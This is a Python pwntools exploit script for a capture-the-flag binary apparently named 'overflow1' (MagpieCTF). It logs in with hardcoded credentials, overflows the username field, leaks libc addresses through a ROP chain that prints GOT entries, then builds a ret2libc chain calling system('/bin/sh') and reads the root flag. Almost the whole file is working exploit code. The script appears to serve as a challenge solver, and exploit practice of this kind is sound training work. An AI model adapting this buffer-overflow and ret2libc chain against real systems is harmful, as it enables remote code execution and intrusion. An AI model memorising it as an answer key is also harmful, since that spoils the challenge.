#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 14003 --libc ../../libc.so.6 ../src/overflow1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/overflow1.debug")
context.terminal = ["alacritty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 14003)
libc = ELF("../../libc.so.6")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
b *main+345
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

# creds
login_user = "cors33"
login_code = "aW5ub2NlbnQ="


def leave_prog(io: connect | process):
    # assumes starting from "> "
    io.sendline(b"4")


def change_username(io: connect | process, payload: bytes):
    # assumes starting from "> "
    io.sendline(b"1")
    io.recvuntil(b"name: ")
    io.sendline(payload)
    io.recvuntil(b"> ")


def login(io: process | connect, username=login_user, password=login_code):
    # login
    io.recvuntil(b"name: ")
    io.sendline(username.encode("ascii"))
    io.recvuntil(b"code: ")
    io.sendline(password.encode("ascii"))
    io.recvuntil(b"> ")


def exploit() -> bool:
    io = start()

    # logging
    io.info("Getting the host flag via. buffer overflow.")

    # from the binary
    payload_size = 88 + 0x20

    # function imports
    syms = ["puts", "printf", "exit", "fgets"]
    addrs = {}

    # creating a rop chain
    rop = ROP(exe)
    for sym in syms:
        # logging in
        login(io)

        # rop chain
        rop = ROP(exe)
        rop.puts(exe.got[sym])
        rop.main()

        # payload
        payload = b"A" * payload_size
        payload += rop.chain()

        # sending it
        io.debug(f"Leaking function addresses.")
        io.debug(rop.dump())
        change_username(io, payload)

        # activating the rop chain
        leave_prog(io)

        # getting address
        addrs[sym] = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
        io.info(f"Leaked address of {sym}@libc: {hex(addrs[sym])}.")

    # asserting libc addresses
    libc.address = addrs[syms[0]] - libc.sym[syms[0]]
    assert libc.address & 0xFFF == 0
    for sym in syms:
        io.debug(f"{sym}: {hex(libc.sym[sym])}@libc, {hex(addrs[sym])}@leak")
        # assert libc.sym[sym] == addrs[sym]

    # forming ret2libc
    login(io)

    # exploit
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.system(next(libc.search(b"/bin/sh")))

    # forming the payload
    payload = b"A" * payload_size
    payload += rop.chain()

    # sending exploit
    change_username(io, payload)
    leave_prog(io)

    # enjoy the shell
    io.sendline(b"cat flag.root.txt")
    flag = io.recvuntil(b"\n", drop=True).decode("ascii")

    # comparing to the actual flag
    with open("./flag.root.txt", "r") as f_in:
        buf = f_in.readline().strip()
        if buf in flag:
            io.success("MagpieCTF - overflow1 : True")
            return 0
        io.failure("MagpieCTF - overflow1 : False")
        return 1


if __name__ == "__main__":
    exit(exploit())
